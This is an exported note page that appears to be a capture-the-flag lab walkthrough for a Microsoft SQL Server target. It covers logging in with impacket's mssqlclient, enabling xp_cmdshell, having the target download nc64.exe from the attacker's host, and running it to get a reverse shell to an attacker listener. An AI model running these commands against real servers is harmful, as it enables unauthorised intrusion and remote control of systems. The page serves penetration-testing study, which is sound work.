<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>mssqlclient</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>mssqlclient</h1><br/><strong>Microsoft SQL Client</strong><br /><br />impacket-mssqlclient<br />or<br />python3 mssqlclient.py -h<br /><br /><a href=""><img src="images/153-1.png" alt="images/153-1.png" /></a><br /><br />python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth <br /><br />Note: Windows Auth Option is used because the Password that was recieved was a windows password rather than MS-SQL password itself.<br /><br /><a href=""><img src="images/153-2.png" alt="images/153-2.png" /></a><br /><br /><a href=""><img src="images/153-3.png" alt="images/153-3.png" /></a><br /><br />Here&#39;s two great articles that can guide us further to our exploration journey with MSSQL Server:<br /><a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a><br /><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a><br /><br /><br />SELECT is_srvrolemember(&#39;sysadmin&#39;);<br /><br /><a href=""><img src="images/153-4.png" alt="images/153-4.png" /></a><br /><br />The output is 1 , which translates to True .<br /><br />First Check if xp_cmdshell is active or not:<br /><br />EXEC xp_cmdshell &#39;net user&#39;;<br /><br /><a href=""><img src="images/153-5.png" alt="images/153-5.png" /></a><br /><br /><br />As we see its not activated, we activate by the following commands:<br /><br />EXEC xp_cmdshell &#39;net user&#39;; 									— privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:<br />EXEC sp_configure &#39;show advanced options&#39;, 1; 		— priv<br />RECONFIGURE; 															— priv<br />EXEC sp_configure &#39;xp_cmdshell&#39;, 1; 						— priv<br />RECONFIGURE; 															— priv<br /><br /><br /><a href=""><img src="images/153-6.png" alt="images/153-6.png" /></a><br /><br />After activating we test it.<br />xp_cmdshell &quot;whoami&quot;<br /><br /><a href=""><img src="images/153-7.png" alt="images/153-7.png" /></a><br /><br />xp_cmdshell &quot;powershell -c pwd&quot;<br /><br /><a href=""><img src="images/153-8.png" alt="images/153-8.png" /></a>\<br /><br />Command to make the Target machine download our nc64.exe backdoor:<br /><br />xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget <a href="http://{Attacker">http://{Attacker</a>_<a href="http://10.10.14.9/nc64.exe">IP}/nc64.exe</a> -outfile nc64.exe&quot;<br /><br /><br />Check the interaction in our local webserver:<br /><a href=""><img src="images/153-9.png" alt="images/153-9.png" /></a><br /><br />As we see the Target_IP has downloaded nc64.exe<br /><br />Run the Backdoor<br />xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {Attacker_IP} {Attacker Listening Port}&quot;<br /><br /><br />Finally looking back at our netcat listener we can confirm our reverse shell and our foothold to the system:<br /><br /><a href=""><img src="images/153-10.png" alt="images/153-10.png" /></a></div>
</body>
</html>
